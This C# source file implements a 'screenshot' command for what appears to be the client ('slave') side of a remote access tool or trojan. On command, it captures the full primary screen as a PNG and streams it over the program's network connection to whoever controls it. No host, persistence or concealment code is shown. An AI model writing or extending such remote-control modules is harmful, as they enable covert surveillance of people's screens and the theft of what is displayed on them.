using Shared;
using Slave.Commands.Core;
using System;
using System.Collections.Generic;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Runtime.InteropServices;
using System.Windows.Forms;

namespace Slave.Commands
{
    internal class Screenshot : ICommand
    {
        public string name { get; } = "screenshot";

        public void Process(List<string> args)
        {
            using (var ms = new MemoryStream())
            {
                var bounds = GetScreenRectangle();
                using (var bitmap = new Bitmap(bounds.Width, bounds.Height))
                {
                    using (var graphics = Graphics.FromImage(bitmap))
                    {
                        graphics.CopyFromScreen(Point.Empty, Point.Empty, bounds.Size);
                    }

                    bitmap.Save(ms, ImageFormat.Png);
                }

                SlaveCommandsManager.networkManager.StreamToNetworkStream(ms);
            }
        }

        static Rectangle GetScreenRectangle()
        {
            try
            {
                // Resolve DPI issue (altered screen resolution)
                if (Environment.OSVersion.Version.Major >= 6)
                {
                    SetProcessDpiAwareness(ProcessDPIAwareness.ProcessPerMonitorDPIAware);
                }
            }
            catch (EntryPointNotFoundException)
            {
                // Exception occures if OS does not implement this API, just ignore it
            }

            return new Rectangle(0, 0, Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height);
        }

        enum ProcessDPIAwareness
        {
            ProcessDPIUnaware = 0,
            ProcessSystemDPIAware = 1,
            ProcessPerMonitorDPIAware = 2
        }

        [DllImport("shcore.dll")]
        static extern int SetProcessDpiAwareness(ProcessDPIAwareness value);
    }
}
